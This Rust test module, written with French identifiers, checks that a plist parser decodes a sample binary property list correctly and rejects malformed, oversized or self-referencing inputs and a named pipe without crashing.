    /// date, données, texte UTF-16, tableau de plus de quinze éléments, dictionnaires imbriqués.
    #[test]
    fn plist_binaire_d_un_autre_programme() {
        let hexa: String = [
            "62706c6973743030da0102030405060708090a0b131415162b2c2d31325c44657374696e6174696f6e7357446f6e6e65",
            "65735447726f735c4775657374456e61626c6564554c69737465574e6567617469665750726f6772616d5f101050726f",
            "6772616d417267756d656e7473555175616e64545265656ca20c11d20d0e0f105d44657374696e6174696f6e49445f10",
            "184c6173744b6e6f776e456e6372797074696f6e537461746551415c4e6f74456e63727970746564d10e1259456e6372",
            "7970746564430001ff140000000000000000800000000000000508af10141718191a1b1c1d1e1f202122232425262728",
            "292a1000100110021003100410051006100710081009100a100b100c100d100e100f101010111012101313ffffffffff",
            "fffff95f102a2f4170706c69636174696f6e732f5a6f6f6d2e6170702f436f6e74656e74732f4d61634f532f7a6f6f6d",
            "a32e2f30582f62696e2f7a7368522d636a006500630068006f002000e9007400e9002027133340f5180000000000233f",
            "d00000000000000008001d002a003200370044004a0052005a006d00730078007b0080008e00a900ab00b800bb00c500",
            "c900da00db00f200f400f600f800fa00fc00fe01000102010401060108010a010c010e01100112011401160118011a01",
            "2301500154015d01600175017e0000000000000201000000000000003300000000000000000000000000000187",
        ]
        .concat();
        let octets: Vec<u8> = (0..hexa.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&hexa[i..i + 2], 16).unwrap())
            .collect();
        let v = lire(&octets).unwrap();
        assert_eq!(
            v.cle("Program").and_then(Valeur::texte),
            Some("/Applications/Zoom.app/Contents/MacOS/zoom")
        );
        let args: Vec<&str> = v
            .cle("ProgramArguments")
            .and_then(Valeur::tableau)
            .unwrap()
            .iter()
            .filter_map(Valeur::texte)
            .collect();
        assert_eq!(args, ["/bin/zsh", "-c", "echo été ✓"]);
        assert_eq!(
            v.cle("GuestEnabled").and_then(Valeur::comme_defaults).as_deref(),
            Some("0")
        );
        assert_eq!(v.cle("Gros"), Some(&Valeur::Entier((1 << 63) + 5)));
        assert_eq!(v.cle("Negatif"), Some(&Valeur::Entier(-7)));
        assert_eq!(v.cle("Reel"), Some(&Valeur::Reel(0.25)));
        assert_eq!(v.cle("Donnees"), Some(&Valeur::Donnees(vec![0, 1, 0xFF])));
        assert_eq!(v.cle("Quand"), Some(&Valeur::Date(86_400.0)));
        assert_eq!(v.cle("Liste").and_then(Valeur::tableau).map(<[Valeur]>::len), Some(20));
        let etats: Vec<&str> = v
            .cle("Destinations")
            .and_then(Valeur::tableau)
            .unwrap()
            .iter()
            .filter_map(|d| d.cle("LastKnownEncryptionState")?.texte())
            .collect();
        assert_eq!(etats, ["NotEncrypted", "Encrypted"]);
    }

    #[test]
    fn plist_binaire_hostile_refuse() {
        // Un tableau qui se contient lui-même.
        assert_eq!(lire(&bplist(&[vec![0xA1, 0]], 0)), None);
        // Référence vers un objet qui n'existe pas.
        assert_eq!(lire(&bplist(&[vec![0xA1, 9]], 0)), None);
        // Texte annoncé plus long que le fichier.
        assert_eq!(
            lire(&bplist(&[vec![0x5F, 0x13, 0, 0, 0, 0, 0xFF, 0xFF, 0xFF, 0xFF]], 0)),
            None
        );
        // Clé de dictionnaire qui n'est pas un texte.
        assert_eq!(lire(&bplist(&[vec![0xD1, 1, 1], vec![0x09]], 0)), None);
        // Racine hors de la table, fichier tronqué, table qui sort du fichier.
        assert_eq!(lire(&bplist(&[vec![0x09]], 5)), None);
        assert_eq!(lire(b"bplist00"), None);
        let mut deborde = bplist(&[vec![0x09]], 0);
        let n = deborde.len();
        deborde[n - 8] = 0xFF;
        assert_eq!(lire(&deborde), None);
        // Mille fois le même tableau de mille éléments : le nombre de valeurs lues est borné.
        let mut objets = vec![vec![0x09]];
        let mut grand = vec![0xAF, 0x11, 0x03, 0xE8];
        grand.extend(std::iter::repeat_n(0, 1000));
        objets.push(grand);
        let mut cite = vec![0xAF, 0x11, 0x03, 0xE8];
        cite.extend(std::iter::repeat_n(1, 1000));
        objets.push(cite);
        // Références sur un octet : les objets 0, 1 et 2 seulement.
        assert_eq!(lire(&bplist(&objets, 2)), None);
    }

    #[test]
    fn fichier_borne_et_tube_refuse() {
        let dossier = std::env::temp_dir().join(format!("vanguard-plist-{}", std::process::id()));
        std::fs::create_dir_all(&dossier).unwrap();
        let f = dossier.join("a.plist");
        std::fs::write(&f, XML).unwrap();
        assert!(matches!(lire_fichier(&f).unwrap(), Lu::Plist(_)));
        // Un fichier démesuré (creux : aucune place prise sur le disque) et un plist binaire piégé sont reconnus en
        // une seule lecture, jamais relus en entier.
        let gros = dossier.join("gros.plist");
        std::fs::File::create(&gros).unwrap().set_len(TAILLE_MAX + 1).unwrap();
        assert_eq!(lire_fichier(&gros).unwrap(), Lu::TropGros);
        let piege = dossier.join("piege.plist");
        std::fs::write(&piege, b"bplist00\xff\xff").unwrap();
        assert_eq!(lire_fichier(&piege).unwrap(), Lu::Hostile);
        std::fs::write(&piege, b"pas un plist").unwrap();
        assert_eq!(lire_fichier(&piege).unwrap(), Lu::Inconnu);
        std::fs::write(
            &piege,
            format!("<plist><array>{}</array></plist>", "<true/>".repeat(250_000)),
        )
        .unwrap();
        assert_eq!(lire_fichier(&piege).unwrap(), Lu::Hostile);
        assert_eq!(
            lire_fichier(&dossier.join("absent.plist")).unwrap_err().kind(),
            std::io::ErrorKind::NotFound
        );
        assert!(lire_fichier(&dossier).is_err());
        #[cfg(unix)]
        {
            let tube = dossier.join("tube.plist");
            let c = std::ffi::CString::new(tube.as_os_str().as_encoded_bytes()).unwrap();
            // SAFETY: chemin C valide, terminé par un nul, vivant pendant l'appel.
            assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
            assert!(lire_fichier(&tube).is_err());
        }
        std::fs::remove_dir_all(&dossier).unwrap();
    }

    proptest::proptest! {
        #![proptest_config(proptest::prelude::ProptestConfig { cases: 2000, failure_persistence: None, ..proptest::prelude::ProptestConfig::default() })]
        #[test]
        fn jamais_de_plantage(octets in proptest::collection::vec(proptest::num::u8::ANY, 0..400)) {
            let mut binaire = b"bplist00".to_vec();
            binaire.extend(&octets);
            let _ = lire(&binaire);
            let _ = lire(&octets);
        }
    }
}
